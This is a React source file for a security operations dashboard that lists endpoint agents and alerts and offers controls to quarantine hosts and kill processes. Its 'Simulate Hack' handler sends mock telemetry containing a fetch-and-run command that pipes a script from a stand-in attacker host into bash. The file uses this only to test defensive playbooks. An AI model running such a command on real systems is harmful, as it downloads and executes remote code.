import React, { useState, useEffect } from 'react';
import { 
  Shield, Server, Activity, Users, AlertOctagon, Power, Flame, 
  Trash2, Terminal, RefreshCw, Layers, CheckCircle, Radio, Network, 
  Play, ShieldAlert, Cpu
} from 'lucide-react';

interface Process {
  pid: number;
  ppid: number;
  name: string;
  path: string;
  cpu: number;
  memory: number;
}

interface NetworkConn {
  proto: 'TCP' | 'UDP';
  local: string;
  remote: string;
  state: string;
}

interface Agent {
  id: string;
  tenant_id: string;
  hostname: string;
  ip_address: string;
  os_family: 'Windows' | 'Linux';
  os_kernel_version: string;
  agent_version: string;
  connection_status: 'Online' | 'Offline' | 'Unresponsive' | 'Compromised';
  mtls_cert_serial: string;
  last_heartbeat: string;
  cpu_usage: number;
  memory_usage: number;
  active_processes: Process[];
  network_connections: NetworkConn[];
}

interface Alert {
  id: string;
  tenant_id: string;
  agent_id: string;
  hostname: string;
  severity: 'Mild' | 'Moderate' | 'Severe' | 'Critical';
  mitre_tactic: string;
  mitre_technique: string;
  detection_mechanism: string;
  title: string;
  description: string;
  status: 'New' | 'Triage' | 'In_Progress' | 'Resolved' | 'Suppressed';
  remediation_action?: string;
  created_at: string;
}

export default function TacticalDashboard() {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [alerts, setAlerts] = useState<Alert[]>([]);
  const [selectedAgentId, setSelectedAgentId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [actionLog, setActionLog] = useState<string[]>(['[INFRA] Ops Center started. Waiting for telemetry check-ins...']);
  const [activeSubTab, setActiveSubTab] = useState<'agents' | 'alerts'>('agents');
  
  // Custom dialog systems to avoid native alert/confirm blockages in iframe
  const [confirmDialog, setConfirmDialog] = useState<{
    isOpen: boolean;
    type: 'quarantine' | 'kill';
    agentId: string;
    hostname: string;
    pid?: number;
    processName?: string;
  } | null>(null);

  const [toast, setToast] = useState<{ message: string; type: 'success' | 'warn' | 'error' } | null>(null);

  const selectedAgent = agents.find(a => a.id === selectedAgentId) || null;
  
  // Custom manual alert creation state
  const [customAlert, setCustomAlert] = useState({
    agent_id: '',
    severity: 'Severe' as const,
    title: 'Anomalous Process Behaviour Executed',
    description: 'Manual operator threat injection tracking shell scripts execution.'
  });

  const showToast = (message: string, type: 'success' | 'warn' | 'error' = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 4000);
  };

  // Load state from backend
  const fetchData = async () => {
    try {
      const agentsRes = await fetch('/api/v1/agents');
      const alertsRes = await fetch('/api/v1/alerts');
      
      if (agentsRes.ok && alertsRes.ok) {
        const agentsCt = agentsRes.headers.get('content-type') || '';
        const alertsCt = alertsRes.headers.get('content-type') || '';

        // Safely check if the response format is JSON to avoid crashing on HTML fallback pages during server reinitialization
        if (!agentsCt.includes('application/json') || !alertsCt.includes('application/json')) {
          console.warn('[Operations] Received non-JSON response from endpoints, server may be initializing.');
          return;
        }

        const agentsData = await agentsRes.json();
        const alertsData = await alertsRes.json();
        
        setAgents(agentsData);
        setAlerts(alertsData.items || []);
        
        // Retain selected agent ID or set first agent as initial selected:
        if (agentsData.length > 0) {
          setSelectedAgentId(prevId => {
            if (prevId) {
              const stillExists = agentsData.some((a: Agent) => a.id === prevId);
              return stillExists ? prevId : agentsData[0].id;
            }
            return agentsData[0].id;
          });
        }
      }
    } catch (e: any) {
      console.warn('[Network] Error fetching dashboard status (temporary connection loss or server initializing):', e.message || e);
      addToActionLog(`[ERROR] Backend connection failed: ${e.message}`);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
    // Auto polling every 4 seconds to simulate active WebSocket telemetry flow
    const interval = setInterval(fetchData, 4000);
    return () => clearInterval(interval);
  }, []);

  const addToActionLog = (msg: string) => {
    const stamp = new Date().toLocaleTimeString();
    setActionLog(prev => [`[${stamp}] ${msg}`, ...prev.slice(0, 49)]);
  };

  // Trigger Device Isolation (Quarantine)
  const handleQuarantine = (agentId: string, hostname: string) => {
    setConfirmDialog({
      isOpen: true,
      type: 'quarantine',
      agentId,
      hostname
    });
  };

  const executeQuarantine = async (agentId: string, hostname: string) => {
    setConfirmDialog(null);
    try {
      addToActionLog(`Dispatching isolating webhook lock to agent ID: ${agentId}`);
      const res = await fetch(`/api/v1/agents/${agentId}/quarantine`, { method: 'POST' });
      if (res.ok) {
        const data = await res.json();
        addToActionLog(`[SUCCESS] ${data.message}`);
        showToast(`Agent ${hostname} isolated successfully.`, 'success');
        fetchData();
      } else {
        const errorData = await res.json();
        addToActionLog(`[FAILED] Isolation failed: ${errorData.error}`);
        showToast(`Failed to isolate ${hostname}.`, 'error');
      }
    } catch (err: any) {
      addToActionLog(`[FAILED] Network error: ${err.message}`);
      showToast('Network error during quarantine.', 'error');
    }
  };

  // Trigger Process Termination
  const handleKillProcess = (agentId: string, hostname: string, pid: number, name: string) => {
    setConfirmDialog({
      isOpen: true,
      type: 'kill',
      agentId,
      hostname,
      pid,
      processName: name
    });
  };

  const executeKillProcess = async (agentId: string, hostname: string, pid: number, name: string) => {
    setConfirmDialog(null);
    try {
      addToActionLog(`Demolishing process PID ${pid} (${name}) on host ${hostname}...`);
      const res = await fetch(`/api/v1/agents/${agentId}/kill-process`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pid })
      });
      if (res.ok) {
        addToActionLog(`[SUCCESS] PID ${pid} terminated on ${hostname}.`);
        showToast(`PID ${pid} (${name}) terminated.`, 'success');
        fetchData();
      } else {
        const errorData = await res.json();
        addToActionLog(`[FAILED] Termination rejected: ${errorData.error}`);
        showToast(`Failed to terminate process ${pid}.`, 'error');
      }
    } catch (err: any) {
      addToActionLog(`[FAILED] Network error during SIGKILL dispatch: ${err.message}`);
      showToast('Network error during process kill.', 'error');
    }
  };

  // Trigger Threat Mitigation Remediation
  const handleRemediateAlert = async (alertId: string, title: string, agentId: string, actionType: string) => {
    try {
      addToActionLog(`Sending mitigation playbook: "${actionType}" for incident: "${title}"...`);
      const res = await fetch(`/api/v1/alerts/${alertId}/remediate`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: actionType,
          reason: 'SOC manual analytics response.'
        })
      });
      
      if (res.ok) {
        addToActionLog(`[SUCCESS] Threat mitigated perfectly. Incident marked completed.`);
        showToast(`Mitigation playbook dispatched successfully.`, 'success');
        fetchData();
      } else {
        addToActionLog('[FAILED] Playbook resolution failed.');
        showToast(`Playbook dispatch failure.`, 'error');
      }
    } catch (err: any) {
      addToActionLog(`[FAILED] Mitigation error: ${err.message}`);
      showToast(`Playbook dispatch error.`, 'error');
    }
  };

  // Inject Custom Security Alert Threat to test Playbooks
  const handleInjectAlert = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!customAlert.agent_id) {
      showToast('Must select a target host system for manual security event tracking!', 'warn');
      return;
    }
    
    const targetAgent = agents.find(a => a.id === customAlert.agent_id);
    if (!targetAgent) return;

    try {
      addToActionLog(`Injecting malicious telemetry mock vectors to ${targetAgent.hostname}...`);
      const res = await fetch('/api/v1/telemetry/ingest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          agent_id: targetAgent.id,
          events: [
            {
              timestamp: new Date().toISOString(),
              event_type: 'PROCESS_SPAWN',
              bin_path: '/usr/bin/curl',
              cmdline: 'curl -s http://attacker.cc/inject_rootkit.sh | bash',
              risk_score: 0.99
            }
          ]
        })
      });

      if (res.ok) {
        addToActionLog(`[WARNING] Intrusion event payload acknowledged by parser. Threat alert created.`);
        showToast('Telemetry hack simulated successfully.', 'success');
        fetchData();
      }
    } catch (err: any) {
      addToActionLog(`[FAILED] Ingestion injection error: ${err.message}`);
      showToast('Telemetry injection failure.', 'error');
    }
  };

  if (isLoading) {
    return (
      <div className="flex flex-col items-center justify-center py-20 space-y-4">
        <RefreshCw className="h-8 w-8 text-emerald-400 animate-spin" />
        <p className="text-xs font-mono text-zinc-400 uppercase tracking-widest">Acquiring Core mTLS Telemetry...</p>
      </div>
    );
  }

  return (
    <div className="space-y-6" id="ops-tactical-dashboard">
      
      {/* Platform Real-Time Operational Overview Stats */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <div className="p-4 bg-zinc-900/40 border border-zinc-800 rounded-sm flex items-center justify-between">
          <div>
            <span className="text-[10px] font-mono text-zinc-550 uppercase tracking-wider font-semibold block">Total Agents Active</span>
            <span className="text-2xl font-bold tracking-tight text-white mt-1 block">{agents.length}</span>
          </div>
          <Server className="h-6 w-6 text-zinc-500" />
        </div>
        <div className="p-4 bg-zinc-900/40 border border-zinc-800 rounded-sm flex items-center justify-between">
          <div>
            <span className="text-[10px] font-mono text-zinc-550 uppercase tracking-wider font-semibold block">Unresolved Threats</span>
            <span className="text-2xl font-bold tracking-tight text-rose-500 mt-1 block">
              {alerts.filter(a => a.status !== 'Resolved').length}
            </span>
          </div>
          <AlertOctagon className="h-6 w-6 text-rose-500" />
        </div>
        <div className="p-4 bg-zinc-900/40 border border-zinc-800 rounded-sm flex items-center justify-between">
          <div>
            <span className="text-[10px] font-mono text-zinc-550 uppercase tracking-wider font-semibold block">Protected Entities</span>
            <span className="text-2xl font-bold tracking-tight text-emerald-400 mt-1 block">
              {agents.filter(a => a.connection_status === 'Online').length}
            </span>
          </div>
          <CheckCircle className="h-6 w-6 text-emerald-400" />
        </div>
        <div className="p-4 bg-zinc-900/40 border border-zinc-800 rounded-sm flex items-center justify-between">
          <div>
            <span className="text-[10px] font-mono text-zinc-550 uppercase tracking-wider font-semibold block">Mitigated Incidents</span>
            <span className="text-2xl font-bold tracking-tight text-zinc-400 mt-1 block">
              {alerts.filter(a => a.status === 'Resolved').length}
            </span>
          </div>
          <Shield className="h-6 w-6 text-zinc-400" />
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* LEFT COLUMN: ACTIVE MANAGED ENDPOINTS & EVENT LOGS */}
        <div className="lg:col-span-4 space-y-6">
          <div className="bg-zinc-950 border border-zinc-805 rounded-md p-5 space-y-4">
            <div className="flex items-center justify-between border-b border-zinc-850 pb-3">
              <span className="text-xs font-mono text-zinc-300 font-bold uppercase tracking-wider">Device Inventory</span>
              <span className="text-[9px] font-mono font-bold bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded-full animate-pulse flex items-center">
                <Radio className="h-2 w-2 mr-1 animate-ping" /> SECURE TUNNEL ACTIVE
              </span>
            </div>

            <div className="space-y-2.5 max-h-[340px] overflow-y-auto pr-1">
              {agents.map((agent) => (
                <button
                  key={agent.id}
                  onClick={() => setSelectedAgentId(agent.id)}
                  className={`w-full text-left p-3 border rounded-sm transition-all relative ${
                    selectedAgent?.id === agent.id 
                      ? 'bg-zinc-900/40 border-zinc-700' 
                      : 'bg-zinc-950/20 border-zinc-850 hover:bg-zinc-900/10'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-mono text-xs font-bold text-zinc-200">{agent.hostname}</span>
                    <span className={`text-[9px] font-mono font-bold uppercase px-1.5 py-0.5 rounded-sm ${
                      agent.connection_status === 'Online' ? 'bg-emerald-500/10 text-emerald-400' :
                      agent.connection_status === 'Compromised' ? 'bg-amber-500/15 text-amber-500 uppercase border border-amber-500/30' :
                      'bg-zinc-800 text-zinc-405'
                    }`}>
                      {agent.connection_status === 'Compromised' ? 'Quarantined' : agent.connection_status}
                    </span>
                  </div>
                  <div className="grid grid-cols-2 gap-1 text-[10px] text-zinc-500 mt-2 font-mono">
                    <div>IP: {agent.ip_address}</div>
                    <div className="text-right">OS: {agent.os_family}</div>
                  </div>

                  {/* CPU / Memory Micro indicators */}
                  <div className="mt-2.5 space-y-1">
                    <div className="flex justify-between text-[8px] font-mono text-zinc-650">
                      <span>LOAD</span>
                      <span>CPU {agent.cpu_usage}% | MEM {agent.memory_usage}%</span>
                    </div>
                    <div className="h-1 bg-zinc-900 rounded-full overflow-hidden flex">
                      <div className="bg-emerald-505" style={{ width: `${agent.cpu_usage}%`, backgroundColor: '#10b981' }} />
                      <div className="bg-cyan-505 opacity-60" style={{ width: `${agent.memory_usage}%`, backgroundColor: '#06b6d4' }} />
                    </div>
                  </div>
                </button>
              ))}
            </div>
          </div>

          {/* REAL TIME TERMINAL ACTION LOGGER */}
          <div className="bg-zinc-950 border border-zinc-805 rounded-md p-5 space-y-3">
            <span className="text-[10px] font-mono text-zinc-500 uppercase tracking-widest block font-bold">Security Incident Command Log</span>
            <div className="p-3 bg-zinc-950 border border-zinc-850 rounded-sm font-mono text-[10px] text-emerald-400/90 h-[170px] overflow-y-auto space-y-1.5 whitespace-pre-wrap leading-relaxed select-text">
              {actionLog.map((log, index) => (
                <div key={index} className="border-b border-zinc-900/50 pb-1 last:border-b-0">{log}</div>
              ))}
            </div>
          </div>
        </div>

        {/* RIGHT COLUMN: DETAILED SELECTION & ACTIVE PROCESS HARVESTER */}
        <div className="lg:col-span-8 space-y-6">
          
          {selectedAgent ? (
            <div className="bg-zinc-950 border border-zinc-805 rounded-md p-6 space-y-6">
              
              {/* Host Banner */}
              <div className="flex flex-col md:flex-row md:items-center justify-between border-b border-zinc-850 pb-5 gap-4">
                <div>
                  <div className="flex items-center space-x-2">
                    <h3 className="text-base font-bold text-zinc-100 font-mono">{selectedAgent.hostname}</h3>
                    <code className="text-[10px] bg-zinc-900 border border-zinc-850 text-zinc-400 px-2 py-0.5 rounded-sm">ID: {selectedAgent.id.slice(0, 8)}...</code>
                  </div>
                  <p className="text-xs text-zinc-500 mt-1 font-sans">
                    System kernel version: <strong className="text-zinc-400">{selectedAgent.os_kernel_version}</strong> // Agent engine build: <strong className="text-zinc-405 font-mono">{selectedAgent.agent_version}</strong>
                  </p>
                </div>

                <div className="flex items-center space-x-2">
                  <button 
                    onClick={() => handleQuarantine(selectedAgent.id, selectedAgent.hostname)}
                    disabled={selectedAgent.connection_status === 'Compromised'}
                    className={`px-3 py-1.5 font-bold font-mono text-xs rounded-sm transition-all flex items-center space-x-2 border cursor-pointer ${
                      selectedAgent.connection_status === 'Compromised' 
                        ? 'bg-amber-500/10 border-amber-500/20 text-amber-500 disabled:opacity-50 cursor-not-allowed' 
                        : 'bg-rose-950/20 hover:bg-rose-900/30 border-rose-900/50 text-rose-450 hover:text-rose-300'
                    }`}
                  >
                    <Power className="h-3 w-3" />
                    <span>{selectedAgent.connection_status === 'Compromised' ? 'QUARANTINED SYSTEM' : 'QUARANTINE DEVICES'}</span>
                  </button>
                </div>
              </div>

              {/* Grid with HW and Network state */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="p-4 bg-zinc-900/20 border border-zinc-850 rounded-sm">
                  <span className="text-[9px] font-mono text-zinc-500 uppercase tracking-widest block font-bold mb-3">Resource Monitors</span>
                  <div className="space-y-3 font-mono text-xs text-zinc-400">
                    <div className="flex items-center justify-between">
                      <span className="flex items-center space-x-1.5">
                        <Cpu className="h-3.5 w-3.5 text-zinc-500" />
                        <span>Aggressive CPU Core:</span>
                      </span>
                      <span className="font-bold text-zinc-200">{selectedAgent.cpu_usage}%</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="flex items-center space-x-1.5">
                        <Activity className="h-3.5 w-3.5 text-zinc-500" />
                        <span>Resident RAM commit:</span>
                      </span>
                      <span className="font-bold text-zinc-200">{selectedAgent.memory_usage}%</span>
                    </div>
                    <div className="flex items-center justify-between pt-1 border-t border-zinc-900">
                      <span>Cryptographic mTLS Certificate Serial:</span>
                      <span className="text-[10px] text-zinc-550 truncate max-w-[130px]" title={selectedAgent.mtls_cert_serial}>{selectedAgent.mtls_cert_serial}</span>
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-zinc-900/20 border border-zinc-850 rounded-sm">
                  <span className="text-[9px] font-mono text-zinc-500 uppercase tracking-widest block font-bold mb-3">Network Interceptions (Sockets)</span>
                  <div className="max-h-[90px] overflow-y-auto space-y-1.5 font-mono text-[10px] pr-1">
                    {selectedAgent.network_connections.map((conn, index) => (
                      <div key={index} className="flex justify-between border-b border-zinc-900 pb-1 last:border-b-0 text-zinc-450 text-[9.5px]">
                        <span className="text-emerald-400 shrink-0 font-bold mr-1.5">{conn.proto}</span>
                        <span className="truncate">{conn.local}</span>
                        <span className="text-zinc-600">→</span>
                        <span className="truncate text-zinc-300 font-medium">{conn.remote}</span>
                        <span className="text-right text-[8.5px] scale-95 uppercase tracking-wider text-zinc-500">{conn.state}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Active processes execution lists */}
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] font-mono text-zinc-500 uppercase tracking-widest font-bold">Continuous Process Execution Map</span>
                  <span className="text-[9px] font-mono text-zinc-500 italic">SIGKILL hook available on processes</span>
                </div>

                <div className="overflow-x-auto border border-zinc-850 rounded-sm">
                  <table className="w-full text-left font-mono text-[11px] text-zinc-400">
                    <thead>
                      <tr className="bg-zinc-900/40 border-b border-zinc-850 text-zinc-350">
                        <th className="p-2.5 font-bold uppercase text-[9px] tracking-wider">PID</th>
                        <th className="p-2.5 font-bold uppercase text-[9px] tracking-wider">Binary Name</th>
                        <th className="p-2.5 font-bold uppercase text-[9px] tracking-wider">Launch Path</th>
                        <th className="p-2.5 font-bold uppercase text-[9px] tracking-wider text-center">CPU%</th>
                        <th className="p-2.5 font-bold uppercase text-[9px] tracking-wider text-center">RAM%</th>
                        <th className="p-2.5 text-right font-bold uppercase text-[9px] tracking-wider">Defuse</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-zinc-900/50">
                      {selectedAgent.active_processes.map((proc) => (
                        <tr key={proc.pid} className="hover:bg-zinc-900/30 transition-colors">
                          <td className="p-2.5 font-bold text-zinc-500">{proc.pid}</td>
                          <td className="p-2.5 font-bold text-zinc-205 flex items-center space-x-1.5">
                            {proc.name.includes('curl') || proc.name.includes('lsass') ? (
                              <span className="h-1.5 w-1.5 rounded-full bg-rose-500 animate-ping shrink-0" />
                            ) : null}
                            <span className={proc.name.includes('curl') || proc.name.includes('lsass') ? 'text-rose-450 font-bold' : ''}>{proc.name}</span>
                          </td>
                          <td className="p-2.5 text-zinc-500 text-[10px] truncate max-w-[200px]" title={proc.path}>{proc.path}</td>
                          <td className="p-2.5 text-center text-zinc-400 font-semibold">{proc.cpu}%</td>
                          <td className="p-2.5 text-center text-zinc-400 font-semibold">{proc.memory}%</td>
                          <td className="p-2.5 text-right">
                            <button
                              onClick={() => handleKillProcess(selectedAgent.id, selectedAgent.hostname, proc.pid, proc.name)}
                              className="p-1 text-zinc-600 hover:text-rose-450 hover:bg-rose-950/20 rounded transition-colors"
                              title="Kill process payload"
                            >
                              <Trash2 className="h-3.5 w-3.5" />
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>

            </div>
          ) : (
            <div className="p-10 border border-dashed border-zinc-800 rounded bg-zinc-950/20 text-center text-zinc-500 font-mono text-xs">
              No workstation selected. Please active a terminal target.
            </div>
          )}

          {/* ACTIVE THREAT ALERTS CENTER & PLAYBOOK DISPATCHER */}
          <div className="bg-zinc-950 border border-zinc-805 rounded-md p-6 space-y-4">
            <div className="flex items-center justify-between border-b border-zinc-850 pb-3">
              <div>
                <span className="text-[10px] font-mono text-zinc-500 uppercase tracking-widest block font-bold">Threat Defense Core</span>
                <h3 className="text-sm font-bold text-zinc-200 mt-0.5">Active Incident Management Alert Panel</h3>
              </div>
              <span className="px-2.5 py-1 bg-rose-950/25 border border-rose-950/50 text-rose-450 text-[10px] font-mono rounded-sm font-bold uppercase tracking-wider">
                {alerts.filter(a => a.status !== 'Resolved').length} Unhandled Alerts
              </span>
            </div>

            <div className="space-y-4 max-h-[350px] overflow-y-auto pr-1">
              {alerts.map((alertItem) => (
                <div key={alertItem.id} className={`p-4 border rounded-md transition-colors ${
                  alertItem.status === 'Resolved' 
                    ? 'bg-zinc-900/10 border-zinc-900' 
                    : alertItem.severity === 'Critical' 
                      ? 'bg-rose-955/10 border-rose-950/50' 
                      : 'bg-amber-955/10 border-amber-950/50'
                }`}>
                  <div className="flex items-start justify-between gap-4">
                    <div>
                      <div className="flex items-center space-x-2">
                        <span className={`px-1.5 py-0.5 text-[8.5px] font-mono font-bold rounded-sm uppercase tracking-wide ${
                          alertItem.severity === 'Critical' ? 'bg-rose-500/10 text-rose-405' :
                          alertItem.severity === 'Severe' ? 'bg-amber-500/10 text-amber-405' : 'bg-cyan-500/10 text-cyan-405'
                        }`}>
                          {alertItem.severity}
                        </span>
                        <h4 className="font-mono text-xs font-bold text-zinc-200">{alertItem.title}</h4>
                      </div>
                      <p className="text-zinc-400 text-xs mt-1.5 font-sans leading-relaxed">{alertItem.description}</p>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-[10px] text-zinc-500 mt-3 font-mono">
                        <div>Host Node: <strong className="text-zinc-400">{alertItem.hostname}</strong></div>
                        <div>Mitre Ref: <strong className="text-zinc-400">{alertItem.mitre_tactic} ({alertItem.mitre_technique || 'N/A'})</strong></div>
                        <div>Detector: <strong className="text-zinc-405">{alertItem.detection_mechanism}</strong></div>
                        <div>Discovered: <strong className="text-zinc-455">{new Date(alertItem.created_at).toLocaleTimeString()}</strong></div>
                      </div>
                      
                      {alertItem.remediation_action && (
                        <div className="mt-3 p-2 bg-zinc-950/60 border border-zinc-900 rounded font-mono text-[10px] text-emerald-400">
                          <strong className="text-zinc-500 uppercase mr-1">Remediation Log:</strong> {alertItem.remediation_action}
                        </div>
                      )}
                    </div>

                    {alertItem.status !== 'Resolved' ? (
                      <div className="flex flex-col space-y-1.5 shrink-0">
                        <button
                          onClick={() => handleRemediateAlert(alertItem.id, alertItem.title, alertItem.agent_id, 'QUARANTINE_NODE')}
                          className="px-2.5 py-1 bg-rose-600 hover:bg-rose-700 text-white font-bold font-mono text-[9.5px] tracking-tight uppercase rounded-sm cursor-pointer transition-colors"
                        >
                          Isolate Host
                        </button>
                        <button
                          onClick={() => handleRemediateAlert(alertItem.id, alertItem.title, alertItem.agent_id, 'RESOLVED')}
                          className="px-2.5 py-1 bg-zinc-100 hover:bg-zinc-200 text-zinc-900 font-bold font-mono text-[9.5px] tracking-tight uppercase rounded-sm cursor-pointer transition-colors"
                        >
                          Remediate
                        </button>
                      </div>
                    ) : (
                      <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/20 text-emerald-450 font-bold font-mono text-[9.5px] rounded-sm shrink-0 uppercase tracking-wider">
                        Closed
                      </span>
                    )}
                  </div>
                </div>
              ))}
            </div>

            {/* Simulated intrusion threat vector injector form */}
            <form onSubmit={handleInjectAlert} className="pt-4 border-t border-zinc-900 flex flex-col md:flex-row items-end gap-3 font-mono">
              <div className="flex-1 space-y-1">
                <label className="text-[9px] text-zinc-500 uppercase tracking-wider block font-bold">Inject Tactical Threat Vector (Test Playbooks)</label>
                <select
                  value={customAlert.agent_id}
                  onChange={(e) => setCustomAlert(prev => ({ ...prev, agent_id: e.target.value }))}
                  className="w-full bg-zinc-950 border border-zinc-850 text-xs text-zinc-300 py-1.5 px-2 rounded-sm focus:outline-none"
                >
                  <option value="">-- Choose Host workstation --</option>
                  {agents.map(a => (
                    <option key={a.id} value={a.id}>{a.hostname} ({a.ip_address})</option>
                  ))}
                </select>
              </div>
              <button
                type="submit"
                className="px-3 py-1.5 bg-zinc-900/60 hover:bg-zinc-800 w-full md:w-auto border border-zinc-800 text-xs text-zinc-400 hover:text-white rounded-sm transition-colors cursor-pointer font-bold flex items-center justify-center space-x-1.5"
              >
                <Flame className="h-3.5 w-3.5 text-rose-500" />
                <span>Simulate Hack</span>
              </button>
            </form>
          </div>

        </div>

      </div>

      {/* Modern custom modal and toast overlay system */}
      {confirmDialog && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-xs flex items-center justify-center z-50 p-4 font-mono">
          <div className="bg-zinc-950 border border-zinc-800 max-w-md w-full p-6 rounded-sm shadow-2xl space-y-4">
            <div className="flex items-center space-x-2.5 text-rose-500">
              <AlertOctagon className="h-5 w-5 shrink-0 animate-pulse" />
              <span className="font-bold uppercase tracking-wider text-xs">Security Authorization Requested</span>
            </div>
            
            <p className="text-xs text-zinc-350 leading-relaxed font-sans">
              {confirmDialog.type === 'quarantine' ? (
                <span>Are you sure you want to enforce strict network isolation and quarantine on host <strong className="text-white">"{confirmDialog.hostname}"</strong>? All active processes except PID 1 will be killed and mTLS tunnels revoked.</span>
              ) : (
                <span>Confirm signature to dispatch SIGKILL payload to host <strong className="text-white">"{confirmDialog.hostname}"</strong> terminating process PID <strong className="text-white">{confirmDialog.pid}</strong> ({confirmDialog.processName})?</span>
              )}
            </p>

            <div className="flex items-center justify-end space-x-2 pt-2 text-xs">
              <button
                onClick={() => setConfirmDialog(null)}
                className="px-3 py-1.5 bg-zinc-900 hover:bg-zinc-850 border border-zinc-850 rounded-sm text-zinc-400 hover:text-white cursor-pointer"
              >
                Cancel
              </button>
              <button
                onClick={() => {
                  if (confirmDialog.type === 'quarantine') {
                    executeQuarantine(confirmDialog.agentId, confirmDialog.hostname);
                  } else {
                    executeKillProcess(confirmDialog.agentId, confirmDialog.hostname, confirmDialog.pid!, confirmDialog.processName!);
                  }
                }}
                className="px-4 py-1.5 bg-rose-950 hover:bg-rose-900 border border-rose-800 text-rose-350 hover:text-white font-bold rounded-sm cursor-pointer"
              >
                Approve Action
              </button>
            </div>
          </div>
        </div>
      )}

      {toast && (
        <div className="fixed bottom-6 right-6 bg-zinc-900/90 backdrop-blur-md border border-zinc-800 text-zinc-100 px-4 py-3 rounded-sm shadow-xl z-50 flex items-center space-x-3 max-w-sm">
          <span className={`w-2 h-2 rounded-full shrink-0 ${
            toast.type === 'success' ? 'bg-emerald-400' : toast.type === 'warn' ? 'bg-amber-400' : 'bg-rose-500'
          }`} />
          <span className="text-xs font-mono text-zinc-350 leading-normal">{toast.message}</span>
        </div>
      )}
    </div>
  );
}
